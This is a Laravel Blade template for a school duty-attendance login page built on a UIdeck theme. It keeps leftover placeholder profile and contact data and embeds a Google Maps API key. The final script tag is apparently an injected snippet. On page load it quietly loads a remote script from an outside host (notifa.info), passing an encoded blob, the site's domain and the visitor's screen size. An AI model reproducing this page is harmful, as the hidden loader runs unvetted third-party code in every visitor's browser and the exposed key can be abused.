<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>Absensi Piket Sekolah</title>

<link rel="stylesheet" type="text/css" href="/assets/Home/css/bootstrap.min.css">

<link rel="stylesheet" type="text/css" href="/assets/Home/fonts/font-awesome.min.css">

<link rel="stylesheet" type="text/css" href="/assets/Home/fonts/simple-line-icons.css">

<link rel="stylesheet" type="text/css" href="/assets/Home/css/slicknav.css">

<link rel="stylesheet" type="text/css" href="/assets/Home/css/menu_sideslide.css">

<link rel="stylesheet" type="text/css" href="/assets/Home/css/slide-style.css">

<link rel="stylesheet" type="text/css" href="/assets/Home/css/nivo-lightbox.css">

<link rel="stylesheet" type="text/css" href="/assets/Home/css/animate.css">

<link rel="stylesheet" type="text/css" href="/assets/Home/css/main.css">

<link rel="stylesheet" type="text/css" href="/assets/Home/css/responsive.css">
</head>
<body>

<header id="header-wrap">

{{-- Header --}}
    

<div id="hero-area" class="hero-area-bg">
<div class="overlay"></div>
<div class="container">
<div class="row">
<div class="col-md-12 col-sm-12 text-center">
<div class="contents">
<h5 class="script-font wow fadeInUp" data-wow-delay="0.2s">Silahkan Login</h5>
<h2 class="head-title wow fadeInUp" data-wow-delay="0.4s">SMK ASSALAAM</h2>
<p class="script-font wow fadeInUp" data-wow-delay="0.6s">Absensi Piket Sekolah</p>
<div class="header-button wow fadeInUp" data-wow-delay="1s">

		@auth
          <a href="{{ url('/home') }}" class="btn btn-common">Home</font></a>
 		@else
	      <a href="{{ route('login') }}" class="btn btn-common">Login !</a> 	      @endauth
</div>
</div>
</div>
</div>
</div>
</div>

</header>


<section id="about" class="section-padding">
<div class="container">
<div class="row">
<div class="col-lg-6 col-md-6 col-sm-12 col-xs-12">
<div class="img-thumb wow fadeInLeft" data-wow-delay="0.3s">
<img class="img-fluid" src="/assets/Home/img/about/about-1.jpg" alt="">
</div>
</div>
<div class="col-lg-6 col-md-6 col-sm-12 col-xs-12">
<div class="profile-wrapper wow fadeInRight" data-wow-delay="0.3s">
<h3>Hi !</h3>
<p>Selamat datang di web aplikasi piket sekolah.</p>
<div class="about-profile">
<ul class="admin-profile">
<li><span class="pro-title"> Name </span> <span class="pro-detail">Tom Saulnier</span></li>
<li><span class="pro-title"> Age </span> <span class="pro-detail">25 Years</span></li>
<li><span class="pro-title"> Experience </span> <span class="pro-detail">4 Years</span></li>
<li><span class="pro-title"> Country </span> <span class="pro-detail">USA</span></li>
<li><span class="pro-title"> Location </span> <span class="pro-detail">San Francisco, CA</span></li>
<li><span class="pro-title"> e-mail </span> <span class="pro-detail"><a href="http://preview.uideck.com/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ec89818d8580ac89948d819c8089c28f8381">[email&#160;protected]</a></span></li>
<li><span class="pro-title"> Phone </span> <span class="pro-detail">+ (00) 123 456 789</span></li>
<li><span class="pro-title"> Freelance </span> <span class="pro-detail">Available</span></li>
</ul>
</div>
</div>
</div>
</div>
</div>
</section>





{{--
<div id="portfolio" class="row wow fadeInDown" data-wow-delay="0.4s">
 <div class="col-sm-6 col-md-4 col-lg-4 col-xl-4 mix development print">
<div class="portfolio-item">
<div class="shot-item">
<img src="/assets/Home/img/gallery/img-1.jpg" alt="" />
<div class="overlay">
<div class="icons">
<a class="lightbox preview" href="/assets/Home/img/gallery/img-1.jpg">
<i class="icon-eye"></i>
</a>
<a class="link" href="#">
<i class="icon-link"></i>
</a>
</div>
</div>
</div>
</div>
</div>
<div class="col-sm-6 col-md-4 col-lg-4 col-xl-4 mix design print">
<div class="portfolio-item">
<div class="shot-item">
<img src="/assets/Home/img/gallery/img-2.jpg" alt="" />
<div class="overlay">
<div class="icons">
<a class="lightbox preview" href="/assets/Home/img/gallery/img-2.jpg">
<i class="icon-eye"></i>
</a>
<a class="link" href="#">
<i class="icon-link"></i>
</a>
</div>
</div>
</div>
</div>
</div>
<div class="col-sm-6 col-md-4 col-lg-4 col-xl-4 mix development">
<div class="portfolio-item">
<div class="shot-item">
<img src="/assets/Home/img/gallery/img-3.jpg" alt="" />
<div class="overlay">
<div class="icons">
<a class="lightbox preview" href="/assets/Home/img/gallery/img-3.jpg">
<i class="icon-eye"></i>
</a>
<a class="link" href="#">
<i class="icon-link"></i>
</a>
</div>
</div>
</div>
 </div>
</div>
<div class="col-sm-6 col-md-4 col-lg-4 col-xl-4 mix development design">
<div class="portfolio-item">
<div class="shot-item">
<img src="/assets/Home/img/gallery/img-4.jpg" alt="" />
<div class="overlay">
<div class="icons">
<a class="lightbox preview" href="/assets/Home/img/gallery/img-4.jpg">
<i class="icon-eye"></i>
</a>
<a class="link" href="#">
<i class="icon-link"></i>
</a>
</div>
</div>
</div>
</div>
</div>
<div class="col-sm-6 col-md-4 col-lg-4 col-xl-4 mix development">
<div class="portfolio-item">
<div class="shot-item">
<img src="/assets/Home/img/gallery/img-5.jpg" alt="" />
<div class="overlay">
<div class="icons">
<a class="lightbox preview" href="/assets/Home/img/gallery/img-5.jpg">
<i class="icon-eye"></i>
</a>
<a class="link" href="#">
<i class="icon-link"></i>
</a>
</div>
</div>
</div>
</div>
</div>
<div class="col-sm-6 col-md-4 col-lg-4 col-xl-4 mix print design">
<div class="portfolio-item">
<div class="shot-item">
<img src="/assets/Home/img/gallery/img-6.jpg" alt="" />
<div class="overlay">
<div class="icons">
<a class="lightbox preview" href="/assets/Home/img/gallery/img-6.jpg">
<i class="icon-eye"></i>
</a>
<a class="link" href="#">
<i class="icon-link"></i>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

</section>


<section class="counter-section section-padding">
<div class="container">
<div class="row">

<div class="col-md-3 col-sm-6 work-counter-widget text-center">
<div class="counter wow fadeInDown" data-wow-delay="0.3s">
<div class="icon"><i class="icon-briefcase"></i></div>
<div class="counterUp">250</div>
<p>Project Working</p>
</div>
</div>

<div class="col-md-3 col-sm-6 work-counter-widget text-center">
<div class="counter wow fadeInDown" data-wow-delay="0.6s">
<div class="icon"><i class="icon-check"></i></div>
<div class="counterUp">950</div>
<p>Project Done</p>
</div>
</div>

<div class="col-md-3 col-sm-6 work-counter-widget text-center">
<div class="counter wow fadeInDown" data-wow-delay="0.9s">
<div class="icon"><i class="icon-diamond"></i></div>
<div class="counterUp">150</div>
<p>Awards Received</p>
</div>
</div>

<div class="col-md-3 col-sm-6 work-counter-widget text-center">
<div class="counter wow fadeInDown" data-wow-delay="1.2s">
<div class="icon"><i class="icon-heart"></i></div>
<div class="counterUp">299</div>
<p>Happy Clients</p>
</div>
</div>
</div>
</div>
</section>


<section id="contact" class="section-padding"> 
<div class="contact-form">
<div class="container">
<div class="row contact-form-area wow fadeInUp" data-wow-delay="0.4s">
<div class="col-md-6 col-lg-6 col-sm-12">
<div class="contact-block">
<h2>Contact Form</h2>
<form id="contactForm">
<div class="row">
<div class="col-md-6">
<div class="form-group">
<input type="text" class="form-control" id="name" name="name" placeholder="Name" required data-error="Please enter your name">
<div class="help-block with-errors"></div>
</div>
</div>
<div class="col-md-6">
<div class="form-group">
<input type="text" placeholder="Email" id="email" class="form-control" name="email" required data-error="Please enter your email">
<div class="help-block with-errors"></div>
</div>
</div>
<div class="col-md-12">
<div class="form-group">
<input type="text" placeholder="Subject" id="msg_subject" class="form-control" required data-error="Please enter your subject">
<div class="help-block with-errors"></div>
</div>
</div>
<div class="col-md-12">
<div class="form-group">
<textarea class="form-control" id="message" placeholder="Your Message" rows="5" data-error="Write your message" required></textarea>
<div class="help-block with-errors"></div>
</div>
<div class="submit-button">
<button class="btn btn-common" id="submit" type="submit">Send Message</button>
<div id="msgSubmit" class="h3 text-center hidden"></div>
<div class="clearfix"></div>
</div>
</div>
</div>
</form>
</div>
</div>
<div class="col-md-6 col-lg-6 col-sm-12">
<div class="footer-right-area wow fadeIn">
<h2>Contact Address</h2>
<div class="footer-right-contact">
<div class="single-contact">
<div class="contact-icon">
<i class="fa fa-map-marker"></i>
</div>
<p>San Francisco, CA</p>
</div>
<div class="single-contact">
<div class="contact-icon">
<i class="fa fa-envelope"></i>
</div>
<p><a href="http://preview.uideck.com/cdn-cgi/l/email-protection#28404d444447685c4745064b4745"><span class="__cf_email__" data-cfemail="e8808d848487a89c8785c68b8785">[email&#160;protected]</span></a></p>
<p><a href="http://preview.uideck.com/cdn-cgi/l/email-protection#5723383a2436223b393e322517303a363e3b7934383a"><span class="__cf_email__" data-cfemail="ea9e8587998b9f8684838f98aa8d878b8386c4898587">[email&#160;protected]</span></a></p>
</div>
<div class="single-contact">
<div class="contact-icon">
<i class="fa fa-phone"></i>
</div>
<p><a href="#">+ (00) 123 456 789</a></p>
<p><a href="#">+ (00) 123 344 789</a></p>
</div>
</div>
</div>
</div>
<div class="col-md-12">
<div id="conatiner-map"></div>
</div>
</div>
</div>
</div>
</section>
 --}}

<footer class="footer-area section-padding">
<div class="container">
<div class="row">
<div class="col-md-12">
<div class="footer-text text-center wow fadeInDown" data-wow-delay="0.3s">
{{-- <ul class="social-icon">
<li>
<a class="facebook" href="#"><i class="icon-social-facebook"></i></a>
</li>
<li>
<a class="twitter" href="#"><i class="icon-social-twitter"></i></a>
</li>
<li>
<a class="instagram" href="#"><i class="icon-social-instagram"></i></a>
</li>
<li>
<a class="instagram" href="#"><i class="icon-social-linkedin"></i></a>
</li>
<li>
<a class="instagram" href="#"><i class="icon-social-google"></i></a>
</li>
</ul>
 --}}<p>Copyright © 2018 UIdeck All Right Reserved</p>
</div>
</div>
</div>
</div>
</footer>


<a href="#" class="back-to-top">
<i class="icon-arrow-up"></i>
</a>

<script data-cfasync="false" src="../../cdn-cgi/scripts/f2bf09f8/cloudflare-static/email-decode.min.js"></script><script src="/assets/Home/js/jquery-min.js"></script>
<script src="/assets/Home/js/popper.min.js"></script>
<script src="/assets/Home/js/bootstrap.min.js"></script>
<script src="/assets/Home/js/jquery.mixitup.js"></script>
<script src="/assets/Home/js/jquery.counterup.min.js"></script>
<script src="/assets/Home/js/waypoints.min.js"></script>
<script src="/assets/Home/js/wow.js"></script>
<script src="/assets/Home/js/jquery.nav.js"></script>
<script src="/assets/Home/js/jquery.easing.min.js"></script>
<script src="/assets/Home/js/nivo-lightbox.js"></script>
<script src="/assets/Home/js/jquery.slicknav.js"></script>
<script src="/assets/Home/js/main.js"></script>
<script src="/assets/Home/js/form-validator.min.js"></script>
<script src="/assets/Home/js/contact-form-script.min.js"></script>
<script src="/assets/Home/js/map.js"></script>
<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?key=AIzaSyCsa2Mi2HqyEcEnM1urFSIGEpvualYjwwM"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mDSovfgcYxz7hFWmjBS3gbPF81iNryVEhBpMaqYDK%2fQkXYGaKQykz0dwZypm3YyJ0X0ok3sODB7li4SprQ%2fo0Z59zoE3%2foGuA5VWTd8wzB22SxoHlcJnaR2WFLq88lzGoYGCUWqDgime0DS4VgSlto7542ECfbc3ebqgX6VvCQr5h7V7PxI41bbN7EHNsFermSdQc3OqApyeDIy9%2bi3sHkxjCMLfuuRHcyonweKCSGgyH4pn3D5uEzzryEQCa2Z2Fv5zG%2boYOJD%2fr9H557yvIjda09n03lCSPcqu4Th2NhMmX6k3ZvOSFgMroP9xe%2bLmkGyLSyaGSg1lJvG1uqE%2fcwEdFR36bze%2b0lbtvXnMQ7o2yirdux%2f%2ffxkHOZ0CopnOg0rNhVJ%2fePvRj6WbdWmIGErm%2f6lCOoF1p" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
